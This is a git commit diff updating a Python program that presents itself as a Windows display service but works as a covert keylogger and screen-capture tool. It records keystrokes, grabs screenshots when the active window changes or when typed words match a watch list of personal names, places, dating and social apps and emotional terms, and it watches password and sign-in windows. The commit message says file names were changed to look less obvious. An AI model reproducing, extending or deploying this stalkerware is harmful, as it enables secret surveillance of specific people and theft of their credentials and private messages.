68842523b7503bf0dcc6a7cdd130a50ee65215e0
jrytting <j.p.rytting@gmail.com>
2020-02-27 10:43:30 -0600

    Version 3.0.3 -- fixed issue with KEYWORD identification -- removed "dashes" in filename to look less obvious like a date

--- WindowsDisplayService.py
+++ WindowsDisplayService.py
@@ -17,7 +17,7 @@ import SMWinservice
 class WindowsDisplayService(SMWinservice.SMWinservice):
 
     def __init__(self):
-        self.__version__ = '3.0.2'       # parser.get('System Configuration', 'version')
+        self.__version__ = '3.0.3'       # parser.get('System Configuration', 'version')
         self.key_counter = 100           # parser.getint('System Configuration', 'key_counter')     # Number of characters to capture before writing to the file
         self.lowest_screen_capture_timer = 3
         self.default_screen_capture_timer = 10
@@ -34,7 +34,6 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
 
         self.count = 0
         self.png_count = 0
-        # self.storedTime = datetime.datetime.utcnow()
         self.storedTime = datetime.datetime.now()
         self.storedWindow = GetWindowText(GetForegroundWindow())
         self.keys = []
@@ -54,31 +53,32 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
                          "Fast Towing", "Shay", "Greg", "Gregg", "Mildred", "towing", "Mesa", "Phoenix", "Tempe",
                          "Justin", "Kilo", "Juanita", "Marlene", "Harlen", "Harlan", "kiss", "Love", "Tow", "Damon",
                          "Brian", "King", "Needham", "Joe", "Sarah", "Sara", "depression", "sad", "cry", "crying",
-                         "facebook", "snapchat", "snap", "Tinder", "cry"]
+                         "facebook", "snapchat", "snap", "tinder", "cry"]
 
         self.special_applications = ["Mail", "Facebook", "Password", "Sign",
                                      "Signin", "User", "User ID", "ID", "Radaris", "Search",
                                      "Instagram"]
 
-        self.ignore_these_applications = ["Sublime", "Pycharm", "Excel", "Sheets", "Powerpoint", "Walmart"]
+        self.ignore_these_applications = ["Sublime", "Pycharm", "Excel", "Sheets", "Powerpoint", "Walmart",
+                                          "Genius", "Panera"]
 
         self.replacementkeydict = {"Key.space": " ",
                                    "Key.enter": " <enter> ",
-                                   "Key.shift": " <shift L> ",
-                                   "Key.shift_r": " <shift R> ",
+                                   "Key.shift": "",
+                                   "Key.shift_r": "",
                                    "Key.backspace": "",
-                                   "Key.alt_l": " <alt left> ",
-                                   "Key.alt_r": " <alt right> ",
+                                   "Key.alt_l": "",
+                                   "Key.alt_r": "",
                                    "Key.delete": " <del> ",
                                    "Key.tab": " <tab> ",
-                                   "Key.ctrl_l": " ",
+                                   "Key.ctrl_l": "",
                                    "Key.right": "",
                                    "Key.left": "",
                                    "Key.up": "",
                                    "Key.down": "",
                                    "Key.caps_lock": " <caps_lock> ",
-                                   "Key.media_volume_up": " <Volume Up> ",
-                                   "Key.media_volume_down": " <Volume Down> ",
+                                   "Key.media_volume_up": "",
+                                   "Key.media_volume_down": "",
                                    "Key.home": "",
                                    "Key.end": "",
                                    "Key.num_lock": "",
@@ -98,7 +98,7 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
             # Will create the file if it does not exist otherwise append
             try:
                 with open(os.path.join(self.save_path, self.log_file_name + self.get_date()), 'a+', encoding='utf-8') as f:
-                    f.write(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + "\t")
+                    f.write(datetime.datetime.now().strftime('%Y%m%d %H:%M:%S') + "\t")
 
                     if len(keys_captured) != 0:
                         # Convert keys_captured to string in preparation to be written to a file
@@ -113,15 +113,26 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
             finally:
                 self.keys.clear()  # Reset the key list
 
+    def convert(self, lst):  # Takes a split string and returns each "word"
+        return lst
+
+    def check_new_words(self, words):
+        if self.blacklisted_words(words):
+            self.write_file(self.keys)
+            self.write_screen()
+
     def blacklisted_words(self, keys_list):
         keystring = ""
+        keystring_list = []
 
         if len(keys_list) != 0:
             for each_key in keys_list:
-                keystring += each_key
+                keystring += str(each_key).replace("'", "")  #  adds each key pressed to make a long string
+
+            keystring_list = self.convert(keystring.lower().split())
 
         # Check keys entered against the list of keywords...
-        if any(x in keystring.split() for x in self.keywords):
+        if any(x in keystring_list for x in self.keywords):
             self.keys.append(" <KEYWORD-FOUND> ")  # global variable is updated with any notes
             return True
 
@@ -145,7 +156,6 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
                     f.write('ValueError with image' + str(ValueError) + "\n")
 
             # Reset the screen_timer each time the screen is saved
-            # self.storedTime = datetime.datetime.utcnow()
             self.storedTime = datetime.datetime.now()
 
             try:
@@ -199,9 +209,7 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
         not individual characters.  I'm defining a word as a string of characters separated by one or more spaces
         '''
         if replacementkey == " ":
-            if self.blacklisted_words(self.keys):
-                self.write_file(self.keys)
-                self.write_screen()
+            self.check_new_words(self.keys)
 
         if len(self.keys) >= self.key_counter:    # write keys at distinct intervals
             self.write_file(self.keys)
@@ -211,7 +219,6 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
         storedtime_plus_delay = (datetime.datetime.strptime(s[:-7], "%Y-%m-%d %H:%M:%S")) + \
             datetime.timedelta(seconds=self.screen_timer)
 
-        # if datetime.datetime.utcnow() >= storedtime_plus_delay:     # capture screen at discrete intervals
         if datetime.datetime.now() >= storedtime_plus_delay:  # capture screen at discrete intervals
             self.write_screen()
 
@@ -224,11 +231,30 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
             self.write_screen()
 
     def application_switched(self):    # if the application focus changes, grab the screen
+        hold_last_key = ""
+
+        self.check_new_words(self.keys) # Before Switching Window check for keywords
+
         if GetWindowText(GetForegroundWindow()) != self.storedWindow:
-            self.write_file(self.keys)  # to keep the keystrokes with the previous window/application
-            self.keys.insert(0, (" <NEW WINDOW> " +
+            if (len(self.keys)) > 0:
+                if (len(self.keys)) != 1:
+                    hold_last_key = str(self.keys[len(self.keys)-1:][0])    # store the last key entered
+                    self.write_file(self.keys[:-1])                 # write all but the last key
+
+
+            if (len(self.keys) != 0):
+                self.keys.insert(0, (" <NEW WINDOW> " +
+                                     str(GetWindowText(GetForegroundWindow()) +
+                                         " <NEW WINDOW> ")))
+                self.write_file(self.keys)
+            else:
+                self.keys.append(" <NEW WINDOW> " +
                                  str(GetWindowText(GetForegroundWindow()) +
-                                     " <NEW WINDOW> " + "\n")))
+                                     " <NEW WINDOW> "))
+                self.write_file(self.keys)
+
+            self.keys.append(hold_last_key)  # put the last key back in list
+
 
             # update storedWindow to the new name of the application
             self.storedWindow = GetWindowText(GetForegroundWindow())
